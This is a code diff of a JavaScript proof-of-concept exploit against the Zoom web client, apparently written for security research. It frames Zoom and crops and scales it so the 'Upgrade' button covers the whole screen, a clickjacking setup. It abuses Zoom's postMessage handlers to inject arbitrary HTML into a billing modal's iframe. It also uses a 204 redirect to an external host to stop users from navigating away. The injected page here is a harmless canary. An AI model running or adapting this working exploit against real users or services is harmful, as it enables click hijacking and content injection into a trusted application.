@@ -1,75 +1,191 @@
 (() => {
   const ZOOM = "https://app.zoom.us";
+  const ZOOM_URL = `${ZOOM}/wc/home`;
   const CANCEL_204 =
-    "https://remedy-attorney-api-herb.trycloudflare.com/204-cancel-navigation";
-  const CANARY_ID = "zoom-frame-poc";
+    "https://zoom-204-vercel.vercel.app/204-cancel-navigation";
+
+  const HOST_ID = "zoom-clickable-postmessage-crop";
+  const OLD_IDS = [
+    "zoom-visual-crop",
+    "zoom-visual-click-blocker",
+    "zoom-frame-poc"
+  ];
+
+  // Previously measured Zoom layout at a 1034 x 962 iframe viewport.
+  const SOURCE = Object.freeze({
+    width: 1034,
+    height: 962,
+    upgradeX: 844.8515625,
+    upgradeY: 15.5,
+    upgradeWidth: 85.1484375,
+    upgradeHeight: 32
+  });
+
   const CANARY_HTML =
     '<!doctype html><meta charset="utf-8"><body style="margin:0;min-height:100vh;display:grid;place-items:center;font:24px system-ui;background:#f3f7ff"><main style="padding:48px;border:4px solid #2d6cdf;border-radius:20px;background:#fff;text-align:center"><h1>DEVFORUM_IFRAME_POSTMESSAGE_CONFIRMED</h1><p>One-shot static HTML canary.</p></main></body>';
+
   const PATHS = [
     "__billingActiveCheckoutModal.instance.modalDom.children.0.children.1.children.1.children.1.srcdoc",
     "__billingActiveCheckoutModal.instance.modalDom.children.0.children.0.children.1.children.1.srcdoc"
   ];
 
-  // Cleanup prior run.
+  // Cleanup prior runs.
+  window.__zoomMergedClickable?.stop?.();
   window.__zoomPoc?.stop?.();
-  document.getElementById(CANARY_ID)?.remove();
+  window.__zoomReliable?.stop?.();
 
-  // Remove only known prompt handlers.
+  OLD_IDS.forEach(id => document.getElementById(id)?.remove());
+
   if (window.__zoomBeforeUnload) {
     removeEventListener("beforeunload", window.__zoomBeforeUnload);
     window.__zoomBeforeUnload = null;
   }
 
-  // Silent one-shot 204 counter-navigation.
-  let armed = false;
-  let used = false;
+  if (!document.body) {
+    throw new Error("Run after document.body exists.");
+  }
 
-  const silentUnload = () => {
-    if (!used) armed = true;
+  let stopped = false;
+  let guardArmed = false;
+  let guardUsed = false;
+
+  // One-shot 204 navigation guard.
+  const onBeforeUnload = () => {
+    if (!guardUsed) guardArmed = true;
   };
 
-  const timer = setInterval(() => {
-    if (!armed || used) return;
-    used = true;
-    armed = false;
-    clearInterval(timer);
-    removeEventListener("beforeunload", silentUnload);
-    console.log("silent 204 guard triggered");
+  addEventListener("beforeunload", onBeforeUnload);
+
+  const guardTimer = setInterval(() => {
+    if (stopped || !guardArmed || guardUsed) return;
+
+    guardUsed = true;
+    guardArmed = false;
+
+    clearInterval(guardTimer);
+    removeEventListener("beforeunload", onBeforeUnload);
+
     window.top.location.href = CANCEL_204;
   }, 1);
 
-  addEventListener("beforeunload", silentUnload, { once: false });
+  // Create stable crop host.
+  const host = document.createElement("div");
+  host.id = HOST_ID;
 
-  // Create Zoom iframe.
+  // Create clickable Zoom iframe.
   const iframe = document.createElement("iframe");
-  iframe.id = CANARY_ID;
-  iframe.src = `${ZOOM}/wc/home`;
-  Object.assign(iframe.style, {
-    position: "fixed",
-    inset: "0",
-    width: "100vw",
-    height: "100vh",
-    border: "0",
-    zIndex: "999999"
-  });
-  document.body.appendChild(iframe);
+  iframe.src = ZOOM_URL;
+  iframe.title = "Clickable Zoom Upgrade crop";
+  iframe.tabIndex = 0;
 
-  const state = window.__zoomPoc = {
+  host.appendChild(iframe);
+  document.body.appendChild(host);
+
+  const setStyle = (element, property, value) => {
+    if (element.style[property] !== value) {
+      element.style[property] = value;
+    }
+  };
+
+  const apply = () => {
+    if (stopped) return;
+    if (!host.isConnected) document.body.appendChild(host);
+
+    const viewportWidth = Math.max(
+      1,
+      document.documentElement.clientWidth
+    );
+
+    const viewportHeight = Math.max(
+      1,
+      document.documentElement.clientHeight
+    );
+
+    const scaleX = viewportWidth / SOURCE.upgradeWidth;
+    const scaleY = viewportHeight / SOURCE.upgradeHeight;
+
+    setStyle(host, "position", "fixed");
+    setStyle(host, "inset", "0px");
+    setStyle(host, "overflow", "hidden");
+    setStyle(host, "zIndex", "2147483647");
+    setStyle(host, "pointerEvents", "none");
+    setStyle(host, "background", "transparent");
+    setStyle(host, "visibility", "visible");
+
+    setStyle(iframe, "position", "absolute");
+    setStyle(iframe, "left", "0px");
+    setStyle(iframe, "top", "0px");
+    setStyle(iframe, "width", `${SOURCE.width}px`);
+    setStyle(iframe, "height", `${SOURCE.height}px`);
+    setStyle(iframe, "border", "0px");
+    setStyle(iframe, "margin", "0px");
+    setStyle(iframe, "padding", "0px");
+    setStyle(iframe, "maxWidth", "none");
+    setStyle(iframe, "maxHeight", "none");
+    setStyle(iframe, "transformOrigin", "0px 0px");
+    setStyle(iframe, "pointerEvents", "auto");
+    setStyle(iframe, "touchAction", "auto");
+    setStyle(iframe, "userSelect", "none");
+    setStyle(iframe, "background", "#fff");
+    setStyle(iframe, "opacity", "1");
+    setStyle(iframe, "visibility", "visible");
+
+    setStyle(
+      iframe,
+      "transform",
+      `translate(${-SOURCE.upgradeX * scaleX}px, ${
+        -SOURCE.upgradeY * scaleY
+      }px) scale(${scaleX}, ${scaleY})`
+    );
+  };
+
+  const listeners = [
+    [window, "resize", apply],
+    [window, "orientationchange", apply],
+    [document, "fullscreenchange", apply]
+  ];
+
+  listeners.forEach(([target, type, handler]) => {
+    target.addEventListener(type, handler, { passive: true });
+  });
+
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener("resize", apply, {
+      passive: true
+    });
+
+    window.visualViewport.addEventListener("scroll", apply, {
+      passive: true
+    });
+  }
+
+  const resizeObserver = new ResizeObserver(apply);
+  resizeObserver.observe(document.documentElement);
+
+  const mutationObserver = new MutationObserver(apply);
+  mutationObserver.observe(document.documentElement, {
+    attributes: true,
+    childList: true,
+    subtree: true,
+    attributeFilter: ["style", "class"]
+  });
+
+  const repairTimer = setInterval(apply, 500);
+
+  // PostMessage state from the second script.
+  const state = (window.__zoomMergedClickable = {
+    host,
+    iframe,
+    apply,
     token: crypto.randomUUID(),
     ready: false,
     handler: null,
     stop: null
-  };
-
-  state.stop = () => {
-    clearInterval(timer);
-    clearInterval(state.injectTimer);
-    clearTimeout(state.retryTimer);
-    if (state.handler) removeEventListener("message", state.handler);
-  };
+  });
 
   const inject = () => {
     if (!state.ready || !iframe.isConnected) return;
+
     for (const objectPath of PATHS) {
       iframe.contentWindow.postMessage({
         type: "mc_safe_set",
@@ -77,8 +193,11 @@
         value: CANARY_HTML
       }, ZOOM);
     }
+
     setTimeout(() => {
-      iframe.contentWindow.postMessage({ type: "mc_hiddenLoading" }, ZOOM);
+      iframe.contentWindow.postMessage({
+        type: "mc_hiddenLoading"
+      }, ZOOM);
     }, 75);
   };
 
@@ -93,14 +212,15 @@
 
     state.ready = true;
     clearInterval(state.probeTimer);
-    console.log("Zoom listener ready; click Upgrade");
+
+    console.log("Zoom listener ready; clickable crop active");
 
     state.injectTimer = setInterval(inject, 350);
     inject();
 
     state.retryTimer = setTimeout(() => {
       clearInterval(state.injectTimer);
-      console.log("PoC retry window ended");
+      console.log("PostMessage retry window ended");
     }, 120000);
   };
 
@@ -108,6 +228,7 @@
 
   const probe = () => {
     if (!iframe.isConnected) return state.stop();
+
     iframe.contentWindow.postMessage({
       type: "mc_safe_call",
       objectPath: "parent.postMessage",
@@ -122,5 +243,44 @@
   iframe.addEventListener("load", probe);
   probe();
 
-  return "ZOOM_POC_ARMED_SILENT_204";
+  state.stop = () => {
+    if (stopped) return;
+    stopped = true;
+
+    clearInterval(guardTimer);
+    clearInterval(state.probeTimer);
+    clearInterval(state.injectTimer);
+    clearTimeout(state.retryTimer);
+    clearInterval(repairTimer);
+
+    resizeObserver.disconnect();
+    mutationObserver.disconnect();
+
+    removeEventListener("beforeunload", onBeforeUnload);
+
+    if (state.handler) {
+      removeEventListener("message", state.handler);
+    }
+
+    listeners.forEach(([target, type, handler]) => {
+      target.removeEventListener(type, handler);
+    });
+
+    if (window.visualViewport) {
+      window.visualViewport.removeEventListener("resize", apply);
+      window.visualViewport.removeEventListener("scroll", apply);
+    }
+
+    host.remove();
+
+    if (window.__zoomMergedClickable === state) {
+      delete window.__zoomMergedClickable;
+    }
+  };
+
+  iframe.addEventListener("load", apply);
+  apply();
+
+  console.log("ZOOM_CLICKABLE_POSTMESSAGE_CROP_ACTIVE");
+  return "ZOOM_CLICKABLE_POSTMESSAGE_CROP_ACTIVE";
 })();
